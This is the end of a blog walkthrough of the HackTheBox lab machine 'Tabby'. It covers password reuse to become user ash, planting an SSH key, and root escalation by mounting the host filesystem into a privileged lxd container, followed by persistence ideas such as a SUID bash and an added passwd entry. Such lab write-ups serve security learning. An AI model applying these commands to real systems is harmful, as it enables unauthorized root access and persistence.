</span></span></code></pre></div><p><div class=img-container><img src=imgs/3538b21b4a734a6981f21967db4e87fa.png alt=3538b21b4a734a6981f21967db4e87fa></div></p><p>The password is <code>admin@it</code>.</p><h4 id=su---ash>SU - ash<a class=anchor aria-hidden=true href=#su---ash>#</a></h4><p>It turns out that the backup password is reused by <code>ash</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>tomcat@tabby:/$ su ash
</span></span><span class=line><span class=cl>su ash
</span></span><span class=line><span class=cl>Password: admin@it
</span></span></code></pre></div><p>I&rsquo;ll put my SSH public key to the authorized_keys file on <code>ash</code> home directory for better shell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>ash@tabby:~/.ssh$ <span class=nb>echo</span> <span class=s1>&#39;ssh-rsa AAAAB3NzaC1y....H/y1qmY6ipsfAec=&#39;</span> &gt; authorized_keys
</span></span></code></pre></div><p>Now I can login with my key.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «tabby» «10.10.14.30»
</span></span><span class=line><span class=cl>$ ssh -i id_rsa ash@10.10.10.194
</span></span><span class=line><span class=cl>ash@tabby:~$                                                                 
</span></span><span class=line><span class=cl>ash@tabby:~$ sudo -l
</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> ash:                                                                   
</span></span><span class=line><span class=cl>Sorry, user ash may not run sudo on tabby.
</span></span><span class=line><span class=cl>ash@tabby:~$ id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>ash<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>ash<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>ash<span class=o>)</span>,4<span class=o>(</span>adm<span class=o>)</span>,24<span class=o>(</span>cdrom<span class=o>)</span>,30<span class=o>(</span>dip<span class=o>)</span>,46<span class=o>(</span>plugdev<span class=o>)</span>,116<span class=o>(</span>lxd<span class=o>)</span>
</span></span></code></pre></div><h3 id=shell-as-root>Shell as root<a class=anchor aria-hidden=true href=#shell-as-root>#</a></h3><h4 id=abusing-lxc>Abusing lxc<a class=anchor aria-hidden=true href=#abusing-lxc>#</a></h4><p>I found out that user <code>ash</code> is a member of the <code>lxd</code> group. This group can be abused by mounting the whole root file system into a container, and then I can access it freely from inside the container.</p><blockquote><p>It holds the same concept as Hack The Box - Cache (on progress..) that uses docker for the root part by mounting <code>/</code> (root file system) to the container and interacting with it from inside the container as a privileged user.</p></blockquote><p>I&rsquo;ll use <a href=https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation>this</a> article as reference.</p><p>First, I’ll create an alpine image on my attacking machine, which is Kali Linux.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «tabby» «10.10.14.30»
</span></span><span class=line><span class=cl>$ git clone https://github.com/saghul/lxd-alpine-builder
</span></span><span class=line><span class=cl>→ root@iamf «tabby» «10.10.14.30»
</span></span><span class=line><span class=cl>$ <span class=nb>cd</span> lxd-alpine-builder
</span></span><span class=line><span class=cl>→ root@iamf «tabby» «10.10.14.30»
</span></span><span class=line><span class=cl>$ ./build-alpine
</span></span></code></pre></div><p><div class=img-container><img src=imgs/99679b825f584f4aaefa3412876cd211.png alt=99679b825f584f4aaefa3412876cd211></div></p><p>Once it&rsquo;s done, there will be an image file called <code>alpine-v3.12-x86_64-blablabla</code>. In my case, it is <code>alpine-v3.12-x86_64-20201107_1900.tar.gz</code>. I&rsquo;ll send the image to Tabby via <code>scp</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@iamf «tabby» «10.10.14.30»
</span></span><span class=line><span class=cl>$ scp -i id_rsa alpine-v3.12-x86_64-20201107_1900.tar.gz  ash@10.10.10.194:/tmp
</span></span></code></pre></div><p>I&rsquo;ll initialize the lxd (storage pool, profile, etc..).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>ash@tabby:~$ lxd init
</span></span></code></pre></div><p>I&rsquo;ll import the image, and then initialize a container with <code>security.privileged</code> enabled from it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>ash@tabby:~$ lxc image import /tmp/alpine-v3.12-x86_64-20201107_1900.tar.gz --alias iamf-img
</span></span><span class=line><span class=cl>ash@tabby:~$ lxc init iamf-img img-container -c security.privileged<span class=o>=</span><span class=nb>true</span>
</span></span></code></pre></div><p>Next, I&rsquo;ll mount the root file system of the host to the container at <code>/mnt/root</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>ash@tabby:~$ lxc config device add img-container iamf-test disk <span class=nv>source</span><span class=o>=</span>/ <span class=nv>path</span><span class=o>=</span>/mnt/root
</span></span><span class=line><span class=cl>Device iamf-test added to img-container
</span></span></code></pre></div><p>After that, I&rsquo;ll start the container. I can confirm it is running using <code>lxc ls</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ash@tabby:~$ lxc start img-container
</span></span></code></pre></div><p><div class=img-container><img src=imgs/image-20210427003512685.png alt=image-20210427003512685></div></p><p>Now I can just interact with the container and grab the root flag on <code>/mnt/root/root/root.txt</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>ash@tabby:~<span class=nv>$lxc</span> <span class=nb>exec</span> img-container /bin/sh
</span></span></code></pre></div><p><div class=img-container><img src=imgs/image-20210427003902623.png alt=image-20210427003902623></div></p><p>Modifications on <code>/mnt/root/</code> will also affect the root file system of the host. Other things I can do from the container is:</p><ul><li>Adding a persistent user via <code>/etc/passwd</code> (<code>/mnt/root/etc/passwd</code>)</li><li>Adding a SUID bash (<code>cp bash /mnt/root/dev/shm/bash; chmod 4755 /mnt/root/dev/shm/bash</code>)</li><li>Enabling root login and put my SSH public key to the root <code>authorized_keys</code> file.</li></ul><div class=post-references><h2>References</h2><ul><li><a href=https://blog.techstacks.com/2010/07/new-manager-roles-in-tomcat-7-are-wonderful.html target=_blank rel="noopener noreferrer">https://blog.techstacks.com/2010/07/new-manager-roles-in-tomcat-7-are-wonderful.html</a></li><li><a href=https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat target=_blank rel="noopener noreferrer">https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat</a></li><li><a href=https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation target=_blank rel="noopener noreferrer">https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation</a></li></ul></div></div></div><div class=post-meta-bottom><span class=post-origin>Originally published at&nbsp;<a href=https://fahmifj.medium.com/hack-the-box-tabby-10-10-10-194-scratch-27ec40161646 target=_blank rel="noopener noreferrer">fahmifj.medium.com</a></span></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/linux/>Linux</a></li><li><a href=https://fahmifj.github.io/tags/lfi/>LFI</a></li><li><a href=https://fahmifj.github.io/tags/tomcat/>Tomcat</a></li><li><a href=https://fahmifj.github.io/tags/password-cracking/>Password-cracking</a></li><li><a href=https://fahmifj.github.io/tags/war-file/>WAR-file</a></li><li><a href=https://fahmifj.github.io/tags/container/>Container</a></li><li><a href=https://fahmifj.github.io/tags/lxc/>lxc</a></li><li><a href=https://fahmifj.github.io/tags/lxd/>lxd</a></li><li><a href=https://fahmifj.github.io/tags/zip2john/>zip2john</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Tabby on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Tabby&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2ftabby%2f&hashtags=Linux%2cLFI%2cTomcat%2cPassword-cracking%2cWAR-file%2cContainer%2clxc%2clxd%2czip2john"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Tabby on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2ftabby%2f&title=HackTheBox%20-%20Tabby&summary=HackTheBox%20-%20Tabby&source=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2ftabby%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Tabby on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2ftabby%2f&title=HackTheBox%20-%20Tabby"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Tabby on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2ftabby%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Tabby on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Tabby%20-%20https%3a%2f%2ffahmifj.github.io%2fhackthebox%2ftabby%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Tabby on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Tabby&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2ftabby%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>